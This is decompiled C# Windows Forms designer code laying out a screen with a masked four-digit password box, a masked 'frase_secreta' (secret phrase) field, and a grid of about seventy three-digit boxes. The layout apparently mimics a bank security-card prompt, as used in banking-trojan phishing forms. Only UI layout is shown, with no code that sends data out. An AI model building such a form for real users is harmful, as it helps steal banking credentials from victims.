		textBox56 = new TextBox();
		textBox55 = new TextBox();
		textBox46 = new TextBox();
		textBox45 = new TextBox();
		textBox43 = new TextBox();
		textBox44 = new TextBox();
		textBox25 = new TextBox();
		textBox26 = new TextBox();
		textBox27 = new TextBox();
		textBox28 = new TextBox();
		textBox29 = new TextBox();
		textBox30 = new TextBox();
		textBox31 = new TextBox();
		textBox32 = new TextBox();
		textBox33 = new TextBox();
		textBox34 = new TextBox();
		textBox15 = new TextBox();
		textBox16 = new TextBox();
		textBox17 = new TextBox();
		textBox18 = new TextBox();
		textBox19 = new TextBox();
		textBox20 = new TextBox();
		textBox21 = new TextBox();
		textBox22 = new TextBox();
		textBox23 = new TextBox();
		textBox24 = new TextBox();
		textBox14 = new TextBox();
		textBox11 = new TextBox();
		textBox12 = new TextBox();
		textBox13 = new TextBox();
		textBox10 = new TextBox();
		textBox9 = new TextBox();
		textBox7 = new TextBox();
		textBox8 = new TextBox();
		textBox6 = new TextBox();
		textBox5 = new TextBox();
		pictureBox58 = new PictureBox();
		Painel_Cartao = new Panel();
		pass_6 = new TextBox();
		pictureBox57 = new PictureBox();
		pictureBox51 = new PictureBox();
		pictureBox52 = new PictureBox();
		pictureBox56 = new PictureBox();
		pictureBox48 = new PictureBox();
		pictureBox49 = new PictureBox();
		pictureBox50 = new PictureBox();
		pictureBox55 = new PictureBox();
		pictureBox54 = new PictureBox();
		pictureBox53 = new PictureBox();
		pictureBox47 = new PictureBox();
		pictureBox44 = new PictureBox();
		pictureBox43 = new PictureBox();
		pictureBox35 = new PictureBox();
		pictureBox36 = new PictureBox();
		pictureBox37 = new PictureBox();
		pictureBox38 = new PictureBox();
		pictureBox39 = new PictureBox();
		pictureBox40 = new PictureBox();
		pictureBox41 = new PictureBox();
		pictureBox42 = new PictureBox();
		pictureBox31 = new PictureBox();
		pictureBox32 = new PictureBox();
		pictureBox33 = new PictureBox();
		pictureBox34 = new PictureBox();
		pictureBox23 = new PictureBox();
		pictureBox24 = new PictureBox();
		pictureBox25 = new PictureBox();
		pictureBox26 = new PictureBox();
		pictureBox27 = new PictureBox();
		pictureBox28 = new PictureBox();
		pictureBox29 = new PictureBox();
		pictureBox30 = new PictureBox();
		pictureBox20 = new PictureBox();
		pictureBox21 = new PictureBox();
		pictureBox22 = new PictureBox();
		pictureBox17 = new PictureBox();
		pictureBox18 = new PictureBox();
		pictureBox16 = new PictureBox();
		pictureBox15 = new PictureBox();
		pictureBox13 = new PictureBox();
		pictureBox14 = new PictureBox();
		pictureBox9 = new PictureBox();
		pictureBox10 = new PictureBox();
		pictureBox11 = new PictureBox();
		pictureBox12 = new PictureBox();
		pictureBox7 = new PictureBox();
		pictureBox8 = new PictureBox();
		pictureBox6 = new PictureBox();
		pictureBox5 = new PictureBox();
		pictureBox4 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		isprime = new PictureBox();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		((Control)Painel_Chave1).SuspendLayout();
		((ISupportInitialize)pictureBox58).BeginInit();
		((Control)Painel_Cartao).SuspendLayout();
		((ISupportInitialize)pictureBox57).BeginInit();
		((ISupportInitialize)pictureBox51).BeginInit();
		((ISupportInitialize)pictureBox52).BeginInit();
		((ISupportInitialize)pictureBox56).BeginInit();
		((ISupportInitialize)pictureBox48).BeginInit();
		((ISupportInitialize)pictureBox49).BeginInit();
		((ISupportInitialize)pictureBox50).BeginInit();
		((ISupportInitialize)pictureBox55).BeginInit();
		((ISupportInitialize)pictureBox54).BeginInit();
		((ISupportInitialize)pictureBox53).BeginInit();
		((ISupportInitialize)pictureBox47).BeginInit();
		((ISupportInitialize)pictureBox44).BeginInit();
		((ISupportInitialize)pictureBox43).BeginInit();
		((ISupportInitialize)pictureBox35).BeginInit();
		((ISupportInitialize)pictureBox36).BeginInit();
		((ISupportInitialize)pictureBox37).BeginInit();
		((ISupportInitialize)pictureBox38).BeginInit();
		((ISupportInitialize)pictureBox39).BeginInit();
		((ISupportInitialize)pictureBox40).BeginInit();
		((ISupportInitialize)pictureBox41).BeginInit();
		((ISupportInitialize)pictureBox42).BeginInit();
		((ISupportInitialize)pictureBox31).BeginInit();
		((ISupportInitialize)pictureBox32).BeginInit();
		((ISupportInitialize)pictureBox33).BeginInit();
		((ISupportInitialize)pictureBox34).BeginInit();
		((ISupportInitialize)pictureBox23).BeginInit();
		((ISupportInitialize)pictureBox24).BeginInit();
		((ISupportInitialize)pictureBox25).BeginInit();
		((ISupportInitialize)pictureBox26).BeginInit();
		((ISupportInitialize)pictureBox27).BeginInit();
		((ISupportInitialize)pictureBox28).BeginInit();
		((ISupportInitialize)pictureBox29).BeginInit();
		((ISupportInitialize)pictureBox30).BeginInit();
		((ISupportInitialize)pictureBox20).BeginInit();
		((ISupportInitialize)pictureBox21).BeginInit();
		((ISupportInitialize)pictureBox22).BeginInit();
		((ISupportInitialize)pictureBox17).BeginInit();
		((ISupportInitialize)pictureBox18).BeginInit();
		((ISupportInitialize)pictureBox16).BeginInit();
		((ISupportInitialize)pictureBox15).BeginInit();
		((ISupportInitialize)pictureBox13).BeginInit();
		((ISupportInitialize)pictureBox14).BeginInit();
		((ISupportInitialize)pictureBox9).BeginInit();
		((ISupportInitialize)pictureBox10).BeginInit();
		((ISupportInitialize)pictureBox11).BeginInit();
		((ISupportInitialize)pictureBox12).BeginInit();
		((ISupportInitialize)pictureBox7).BeginInit();
		((ISupportInitialize)pictureBox8).BeginInit();
		((ISupportInitialize)pictureBox6).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)isprime).BeginInit();
		((Control)statusStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)pass_4).set_BackColor(Color.White);
		((TextBoxBase)pass_4).set_BorderStyle((BorderStyle)0);
		((Control)pass_4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)pass_4).set_Location(new Point(31, 203));
		((TextBoxBase)pass_4).set_MaxLength(4);
		((Control)pass_4).set_Name("pass_4");
		pass_4.set_PasswordChar('●');
		((TextBoxBase)pass_4).set_ReadOnly(true);
		((Control)pass_4).set_Size(new Size(53, 14));
		((Control)pass_4).set_TabIndex(1);
		((Control)pass_4).add_TextChanged((EventHandler)pass_4_TextChanged);
		((TextBoxBase)frase_secreta).set_BorderStyle((BorderStyle)0);
		((Control)frase_secreta).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)frase_secreta).set_Location(new Point(31, 246));
		((Control)frase_secreta).set_Name("frase_secreta");
		frase_secreta.set_PasswordChar('●');
		((Control)frase_secreta).set_Size(new Size(317, 14));
		((Control)frase_secreta).set_TabIndex(2);
		((Control)frase_secreta).add_TextChanged((EventHandler)textBox2_TextChanged);
		((Control)textBox3).set_BackColor(Color.White);
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)0);
		((Control)textBox3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_Location(new Point(361, 245));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(36, 14));
		((Control)textBox3).set_TabIndex(3);
		((Control)textBox3).set_Text("0");
		((Control)Painel_Chave1).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_Chave1.BackgroundImage"));
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox74);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox64);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox54);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox35);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox73);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox63);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox53);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox36);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox72);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox62);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox52);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox37);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox71);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox61);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox51);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox38);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox70);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox60);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox50);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox39);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox69);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox59);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox49);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox40);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox68);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox58);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox48);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox41);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox67);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox57);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox47);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox42);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox66);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox65);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox56);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox55);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox46);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox45);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox43);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox44);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox25);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox26);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox27);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox28);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox29);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox30);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox31);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox32);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox33);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox34);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox15);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox16);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox17);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox18);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox19);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox20);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox21);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox22);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox23);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox24);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox14);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox11);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox12);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox13);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox10);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox9);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox7);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox8);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox6);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)textBox5);
		((Control)Painel_Chave1).get_Controls().Add((Control)(object)pictureBox58);
		((Control)Painel_Chave1).set_Location(new Point(16, 95));
		((Control)Painel_Chave1).set_Name("Painel_Chave1");
		((Control)Painel_Chave1).set_Size(new Size(624, 364));
		((Control)Painel_Chave1).set_TabIndex(1);
		((Control)Painel_Chave1).set_Visible(false);
		((TextBoxBase)textBox74).set_BorderStyle((BorderStyle)0);
		((Control)textBox74).set_Font(new Font("Verdana", 7f));
		((Control)textBox74).set_Location(new Point(541, 234));
		((Control)textBox74).set_Margin(new Padding(0));
		((TextBoxBase)textBox74).set_MaxLength(3);
		((Control)textBox74).set_Name("textBox74");
		((Control)textBox74).set_Size(new Size(24, 12));
		((Control)textBox74).set_TabIndex(69);
		((Control)textBox74).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox64).set_BorderStyle((BorderStyle)0);
		((Control)textBox64).set_Font(new Font("Verdana", 7f));
		((Control)textBox64).set_Location(new Point(500, 234));
		((Control)textBox64).set_Margin(new Padding(0));
		((TextBoxBase)textBox64).set_MaxLength(3);
		((Control)textBox64).set_Name("textBox64");
		((Control)textBox64).set_Size(new Size(25, 12));
		((Control)textBox64).set_TabIndex(59);
		((Control)textBox64).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox54).set_BorderStyle((BorderStyle)0);
		((Control)textBox54).set_Font(new Font("Verdana", 7f));
		((Control)textBox54).set_Location(new Point(457, 234));
		((Control)textBox54).set_Margin(new Padding(0));
		((TextBoxBase)textBox54).set_MaxLength(3);
		((Control)textBox54).set_Name("textBox54");
		((Control)textBox54).set_Size(new Size(25, 12));
		((Control)textBox54).set_TabIndex(49);
		((Control)textBox54).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox35).set_BorderStyle((BorderStyle)0);
		((Control)textBox35).set_Font(new Font("Verdana", 7f));
		((Control)textBox35).set_Location(new Point(414, 234));
		((Control)textBox35).set_Margin(new Padding(0));
		((TextBoxBase)textBox35).set_MaxLength(3);
		((Control)textBox35).set_Name("textBox35");
		((Control)textBox35).set_Size(new Size(25, 12));
		((Control)textBox35).set_TabIndex(39);
		((Control)textBox35).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox73).set_BorderStyle((BorderStyle)0);
		((Control)textBox73).set_Font(new Font("Verdana", 7f));
		((Control)textBox73).set_Location(new Point(541, 220));
		((Control)textBox73).set_Margin(new Padding(0));
		((TextBoxBase)textBox73).set_MaxLength(3);
		((Control)textBox73).set_Name("textBox73");
		((Control)textBox73).set_Size(new Size(24, 12));
		((Control)textBox73).set_TabIndex(68);
		((Control)textBox73).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox63).set_BorderStyle((BorderStyle)0);
		((Control)textBox63).set_Font(new Font("Verdana", 7f));
		((Control)textBox63).set_Location(new Point(500, 220));
		((Control)textBox63).set_Margin(new Padding(0));
		((TextBoxBase)textBox63).set_MaxLength(3);
		((Control)textBox63).set_Name("textBox63");
		((Control)textBox63).set_Size(new Size(25, 12));
		((Control)textBox63).set_TabIndex(58);
		((Control)textBox63).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox53).set_BorderStyle((BorderStyle)0);
		((Control)textBox53).set_Font(new Font("Verdana", 7f));
		((Control)textBox53).set_Location(new Point(457, 220));
		((Control)textBox53).set_Margin(new Padding(0));
		((TextBoxBase)textBox53).set_MaxLength(3);
		((Control)textBox53).set_Name("textBox53");
		((Control)textBox53).set_Size(new Size(25, 12));
		((Control)textBox53).set_TabIndex(48);
		((Control)textBox53).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox36).set_BorderStyle((BorderStyle)0);
		((Control)textBox36).set_Font(new Font("Verdana", 7f));
		((Control)textBox36).set_Location(new Point(414, 220));
		((Control)textBox36).set_Margin(new Padding(0));
		((TextBoxBase)textBox36).set_MaxLength(3);
		((Control)textBox36).set_Name("textBox36");
		((Control)textBox36).set_Size(new Size(25, 12));
		((Control)textBox36).set_TabIndex(38);
		((Control)textBox36).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox72).set_BorderStyle((BorderStyle)0);
		((Control)textBox72).set_Font(new Font("Verdana", 7f));
		((Control)textBox72).set_Location(new Point(541, 206));
		((Control)textBox72).set_Margin(new Padding(0));
		((TextBoxBase)textBox72).set_MaxLength(3);
		((Control)textBox72).set_Name("textBox72");
		((Control)textBox72).set_Size(new Size(24, 12));
		((Control)textBox72).set_TabIndex(67);
		((Control)textBox72).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox62).set_BorderStyle((BorderStyle)0);
		((Control)textBox62).set_Font(new Font("Verdana", 7f));
		((Control)textBox62).set_Location(new Point(500, 206));
		((Control)textBox62).set_Margin(new Padding(0));
		((TextBoxBase)textBox62).set_MaxLength(3);
		((Control)textBox62).set_Name("textBox62");
		((Control)textBox62).set_Size(new Size(25, 12));
		((Control)textBox62).set_TabIndex(57);
		((Control)textBox62).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox52).set_BorderStyle((BorderStyle)0);
		((Control)textBox52).set_Font(new Font("Verdana", 7f));
		((Control)textBox52).set_Location(new Point(457, 206));
		((Control)textBox52).set_Margin(new Padding(0));
		((TextBoxBase)textBox52).set_MaxLength(3);
		((Control)textBox52).set_Name("textBox52");
		((Control)textBox52).set_Size(new Size(25, 12));
		((Control)textBox52).set_TabIndex(47);
		((Control)textBox52).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox37).set_BorderStyle((BorderStyle)0);
		((Control)textBox37).set_Font(new Font("Verdana", 7f));
		((Control)textBox37).set_Location(new Point(414, 206));
		((Control)textBox37).set_Margin(new Padding(0));
		((TextBoxBase)textBox37).set_MaxLength(3);
		((Control)textBox37).set_Name("textBox37");
		((Control)textBox37).set_Size(new Size(25, 12));
		((Control)textBox37).set_TabIndex(37);
		((Control)textBox37).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox71).set_BorderStyle((BorderStyle)0);
		((Control)textBox71).set_Font(new Font("Verdana", 7f));
		((Control)textBox71).set_Location(new Point(541, 193));
		((Control)textBox71).set_Margin(new Padding(0));
		((TextBoxBase)textBox71).set_MaxLength(3);
		((Control)textBox71).set_Name("textBox71");
		((Control)textBox71).set_Size(new Size(24, 12));
		((Control)textBox71).set_TabIndex(66);
		((Control)textBox71).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox61).set_BorderStyle((BorderStyle)0);
		((Control)textBox61).set_Font(new Font("Verdana", 7f));
		((Control)textBox61).set_Location(new Point(500, 193));
		((Control)textBox61).set_Margin(new Padding(0));
		((TextBoxBase)textBox61).set_MaxLength(3);
		((Control)textBox61).set_Name("textBox61");
		((Control)textBox61).set_Size(new Size(25, 12));
		((Control)textBox61).set_TabIndex(56);
		((Control)textBox61).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox51).set_BorderStyle((BorderStyle)0);
		((Control)textBox51).set_Font(new Font("Verdana", 7f));
		((Control)textBox51).set_Location(new Point(457, 193));
		((Control)textBox51).set_Margin(new Padding(0));
		((TextBoxBase)textBox51).set_MaxLength(3);
		((Control)textBox51).set_Name("textBox51");
		((Control)textBox51).set_Size(new Size(25, 12));
		((Control)textBox51).set_TabIndex(46);
		((Control)textBox51).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox38).set_BorderStyle((BorderStyle)0);
		((Control)textBox38).set_Font(new Font("Verdana", 7f));
		((Control)textBox38).set_Location(new Point(414, 193));
		((Control)textBox38).set_Margin(new Padding(0));
		((TextBoxBase)textBox38).set_MaxLength(3);
		((Control)textBox38).set_Name("textBox38");
		((Control)textBox38).set_Size(new Size(25, 12));
		((Control)textBox38).set_TabIndex(36);
		((Control)textBox38).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox70).set_BorderStyle((BorderStyle)0);
		((Control)textBox70).set_Font(new Font("Verdana", 7f));
		((Control)textBox70).set_Location(new Point(541, 179));
		((Control)textBox70).set_Margin(new Padding(0));
		((TextBoxBase)textBox70).set_MaxLength(3);
		((Control)textBox70).set_Name("textBox70");
		((Control)textBox70).set_Size(new Size(24, 12));
		((Control)textBox70).set_TabIndex(65);
		((Control)textBox70).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox60).set_BorderStyle((BorderStyle)0);
		((Control)textBox60).set_Font(new Font("Verdana", 7f));
		((Control)textBox60).set_Location(new Point(500, 179));
		((Control)textBox60).set_Margin(new Padding(0));
		((TextBoxBase)textBox60).set_MaxLength(3);
		((Control)textBox60).set_Name("textBox60");
		((Control)textBox60).set_Size(new Size(25, 12));
		((Control)textBox60).set_TabIndex(55);
		((Control)textBox60).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox50).set_BorderStyle((BorderStyle)0);
		((Control)textBox50).set_Font(new Font("Verdana", 7f));
		((Control)textBox50).set_Location(new Point(457, 179));
		((Control)textBox50).set_Margin(new Padding(0));
		((TextBoxBase)textBox50).set_MaxLength(3);
		((Control)textBox50).set_Name("textBox50");
		((Control)textBox50).set_Size(new Size(25, 12));
		((Control)textBox50).set_TabIndex(45);
		((Control)textBox50).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox39).set_BorderStyle((BorderStyle)0);
		((Control)textBox39).set_Font(new Font("Verdana", 7f));
		((Control)textBox39).set_Location(new Point(414, 179));
		((Control)textBox39).set_Margin(new Padding(0));
		((TextBoxBase)textBox39).set_MaxLength(3);
		((Control)textBox39).set_Name("textBox39");
		((Control)textBox39).set_Size(new Size(25, 12));
		((Control)textBox39).set_TabIndex(35);
		((Control)textBox39).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox69).set_BorderStyle((BorderStyle)0);
		((Control)textBox69).set_Font(new Font("Verdana", 7f));
		((Control)textBox69).set_Location(new Point(541, 166));
		((Control)textBox69).set_Margin(new Padding(0));
		((TextBoxBase)textBox69).set_MaxLength(3);
		((Control)textBox69).set_Name("textBox69");
		((Control)textBox69).set_Size(new Size(24, 12));
		((Control)textBox69).set_TabIndex(64);
		((Control)textBox69).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox59).set_BorderStyle((BorderStyle)0);
		((Control)textBox59).set_Font(new Font("Verdana", 7f));
		((Control)textBox59).set_Location(new Point(500, 166));
		((Control)textBox59).set_Margin(new Padding(0));
		((TextBoxBase)textBox59).set_MaxLength(3);
		((Control)textBox59).set_Name("textBox59");
		((Control)textBox59).set_Size(new Size(25, 12));
		((Control)textBox59).set_TabIndex(54);
		((Control)textBox59).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox49).set_BorderStyle((BorderStyle)0);
		((Control)textBox49).set_Font(new Font("Verdana", 7f));
		((Control)textBox49).set_Location(new Point(457, 166));
		((Control)textBox49).set_Margin(new Padding(0));
		((TextBoxBase)textBox49).set_MaxLength(3);
		((Control)textBox49).set_Name("textBox49");
		((Control)textBox49).set_Size(new Size(25, 12));
		((Control)textBox49).set_TabIndex(44);
		((Control)textBox49).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox40).set_BorderStyle((BorderStyle)0);
		((Control)textBox40).set_Font(new Font("Verdana", 7f));
		((Control)textBox40).set_Location(new Point(414, 166));
		((Control)textBox40).set_Margin(new Padding(0));
		((TextBoxBase)textBox40).set_MaxLength(3);
		((Control)textBox40).set_Name("textBox40");
		((Control)textBox40).set_Size(new Size(25, 12));
		((Control)textBox40).set_TabIndex(34);
		((Control)textBox40).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox68).set_BorderStyle((BorderStyle)0);
		((Control)textBox68).set_Font(new Font("Verdana", 7f));
		((Control)textBox68).set_Location(new Point(541, 153));
		((Control)textBox68).set_Margin(new Padding(0));
		((TextBoxBase)textBox68).set_MaxLength(3);
		((Control)textBox68).set_Name("textBox68");
		((Control)textBox68).set_Size(new Size(24, 12));
		((Control)textBox68).set_TabIndex(63);
		((Control)textBox68).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox58).set_BorderStyle((BorderStyle)0);
		((Control)textBox58).set_Font(new Font("Verdana", 7f));
		((Control)textBox58).set_Location(new Point(500, 153));
		((Control)textBox58).set_Margin(new Padding(0));
		((TextBoxBase)textBox58).set_MaxLength(3);
		((Control)textBox58).set_Name("textBox58");
		((Control)textBox58).set_Size(new Size(25, 12));
		((Control)textBox58).set_TabIndex(53);
		((Control)textBox58).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox48).set_BorderStyle((BorderStyle)0);
		((Control)textBox48).set_Font(new Font("Verdana", 7f));
		((Control)textBox48).set_Location(new Point(457, 153));
		((Control)textBox48).set_Margin(new Padding(0));
		((TextBoxBase)textBox48).set_MaxLength(3);
		((Control)textBox48).set_Name("textBox48");
		((Control)textBox48).set_Size(new Size(25, 12));
		((Control)textBox48).set_TabIndex(43);
		((Control)textBox48).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox41).set_BorderStyle((BorderStyle)0);
		((Control)textBox41).set_Font(new Font("Verdana", 7f));
		((Control)textBox41).set_Location(new Point(414, 153));
		((Control)textBox41).set_Margin(new Padding(0));
		((TextBoxBase)textBox41).set_MaxLength(3);
		((Control)textBox41).set_Name("textBox41");
		((Control)textBox41).set_Size(new Size(25, 12));
		((Control)textBox41).set_TabIndex(33);
		((Control)textBox41).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox67).set_BorderStyle((BorderStyle)0);
		((Control)textBox67).set_Font(new Font("Verdana", 7f));
		((Control)textBox67).set_Location(new Point(541, 140));
		((Control)textBox67).set_Margin(new Padding(0));
		((TextBoxBase)textBox67).set_MaxLength(3);
		((Control)textBox67).set_Name("textBox67");
		((Control)textBox67).set_Size(new Size(24, 12));
		((Control)textBox67).set_TabIndex(62);
		((Control)textBox67).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox57).set_BorderStyle((BorderStyle)0);
		((Control)textBox57).set_Font(new Font("Verdana", 7f));
		((Control)textBox57).set_Location(new Point(500, 140));
		((Control)textBox57).set_Margin(new Padding(0));
		((TextBoxBase)textBox57).set_MaxLength(3);
		((Control)textBox57).set_Name("textBox57");
		((Control)textBox57).set_Size(new Size(25, 12));
		((Control)textBox57).set_TabIndex(52);
		((Control)textBox57).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox47).set_BorderStyle((BorderStyle)0);
		((Control)textBox47).set_Font(new Font("Verdana", 7f));
		((Control)textBox47).set_Location(new Point(457, 140));
		((Control)textBox47).set_Margin(new Padding(0));
		((TextBoxBase)textBox47).set_MaxLength(3);
		((Control)textBox47).set_Name("textBox47");
		((Control)textBox47).set_Size(new Size(25, 12));
		((Control)textBox47).set_TabIndex(42);
		((Control)textBox47).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox42).set_BorderStyle((BorderStyle)0);
		((Control)textBox42).set_Font(new Font("Verdana", 7f));
		((Control)textBox42).set_Location(new Point(414, 140));
		((Control)textBox42).set_Margin(new Padding(0));
		((TextBoxBase)textBox42).set_MaxLength(3);
		((Control)textBox42).set_Name("textBox42");
		((Control)textBox42).set_Size(new Size(25, 12));
		((Control)textBox42).set_TabIndex(32);
		((Control)textBox42).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox66).set_BorderStyle((BorderStyle)0);
		((Control)textBox66).set_Font(new Font("Verdana", 7f));
		((Control)textBox66).set_Location(new Point(541, 126));
		((Control)textBox66).set_Margin(new Padding(0));
		((TextBoxBase)textBox66).set_MaxLength(3);
		((Control)textBox66).set_Name("textBox66");
		((Control)textBox66).set_Size(new Size(24, 12));
		((Control)textBox66).set_TabIndex(61);
		((Control)textBox66).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox65).set_BorderStyle((BorderStyle)0);
		((Control)textBox65).set_Font(new Font("Verdana", 7f));
		((Control)textBox65).set_Location(new Point(541, 112));
		((Control)textBox65).set_Margin(new Padding(0));
		((TextBoxBase)textBox65).set_MaxLength(3);
		((Control)textBox65).set_Name("textBox65");
		((Control)textBox65).set_Size(new Size(24, 12));
		((Control)textBox65).set_TabIndex(60);
		((Control)textBox65).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox56).set_BorderStyle((BorderStyle)0);
		((Control)textBox56).set_Font(new Font("Verdana", 7f));
		((Control)textBox56).set_Location(new Point(500, 126));
		((Control)textBox56).set_Margin(new Padding(0));
		((TextBoxBase)textBox56).set_MaxLength(3);
		((Control)textBox56).set_Name("textBox56");
		((Control)textBox56).set_Size(new Size(25, 12));
		((Control)textBox56).set_TabIndex(51);
		((Control)textBox56).add_KeyPress(new KeyPressEventHandler(NoKeys));
